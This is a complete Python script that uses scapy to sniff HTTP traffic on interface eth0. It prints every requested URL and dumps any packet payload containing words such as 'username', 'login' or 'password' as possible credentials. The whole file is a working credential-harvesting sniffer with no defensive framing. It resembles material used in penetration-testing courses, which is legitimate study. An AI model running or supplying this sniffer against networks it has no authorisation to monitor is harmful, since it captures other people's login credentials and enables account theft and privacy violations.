import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    try:
        scapy.sniff(iface=interface, store=False, prn=process_packet)
    except Exception as e:
        print(f"Error occurred: {e}")

def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        try:
            url = packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()
            print("[+] HTTP Request >> " + str(url))
            if packet.haslayer(scapy.Raw):
                load = packet[scapy.Raw].load.decode(errors='ignore')
                keywords = ["username", "user", "login", "password", "pass"]
                for keyword in keywords:
                    if keyword in load.lower():
                        print("\n\n[+] Possible username/password > " + str(load) + "\n\n")
                        break
        except AttributeError as e:
            print(f"AttributeError occurred: {e}")

sniff("eth0")
